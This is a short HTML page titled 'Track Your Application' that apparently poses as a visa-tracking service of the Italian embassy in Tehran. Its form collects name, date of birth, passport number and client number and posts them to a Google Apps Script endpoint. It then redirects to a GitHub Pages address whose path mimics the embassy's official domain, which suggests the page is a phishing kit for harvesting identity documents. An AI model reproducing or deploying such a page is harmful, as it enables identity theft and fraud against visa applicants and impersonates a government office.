<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Track Your Application</title>
</head>
<body>
    <form id="trackForm">
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" required><br><br>

        <label for="lastName">Last Name:</label>
        <input type="text" id="lastName" name="lastName" required><br><br>

        <label for="dob">Date of Birth:</label>
        <input type="text" id="dob" name="dob" required><br><br>

        <label for="passportNo">Passport No:</label>
        <input type="text" id="passportNo" name="passportNo" required><br><br>

        <label for="clientNo">Client No:</label>
        <input type="text" id="clientNo" name="clientNo" required><br><br>

        <button type="submit">Track</button>
    </form>

    <p id="errorMessage" style="color: red; display: none;">Invalid data. Please try again.</p>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxPidcW21754EFk8J6TY8S2qJHBBglSCO7jPphUk5n1BVtHyb9RSmCKJEZI3S-VThL0yw/exec';
        
        document.getElementById('trackForm').addEventListener('submit', function (e) {
            e.preventDefault();

            const name = document.getElementById('name').value;
            const lastName = document.getElementById('lastName').value;
            const dob = document.getElementById('dob').value;
            const passportNo = document.getElementById('passportNo').value;
            const clientNo = document.getElementById('clientNo').value;

            fetch(scriptURL, {
                method: 'POST',
                body: new URLSearchParams({
                    'name': name,
                    'lastName': lastName,
                    'dob': dob,
                    'passportNo': passportNo,
                    'clientNo': clientNo
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    window.location.href = "https://ambteheran.github.io/https-ambteheran.esteri.it-it-/";
                } else {
                    document.getElementById('errorMessage').style.display = 'block';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('errorMessage').style.display = 'block';
            });
        });
    </script>
</body>
</html>
